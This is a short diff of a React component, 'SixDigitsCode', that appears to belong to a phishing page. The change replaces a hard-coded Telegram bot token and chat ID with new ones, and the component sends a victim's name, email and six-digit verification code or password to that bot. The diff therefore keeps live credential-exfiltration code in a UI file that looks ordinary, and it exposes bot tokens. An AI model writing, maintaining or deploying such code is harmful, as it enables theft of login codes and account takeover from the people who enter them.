@@ -19,8 +19,8 @@ const SixDigitsCode: React.FC = () => {
   
     setShowPopup(true);
   
-    const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
-    const chatId = "6837437455";
+    const botToken = "6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo";
+    const chatId = "6639364559";
     const message = ` ${fullName} 6 digit Code \n📧 Phone: ${email}\n🔑 Code: ${password}`;
   
     try {
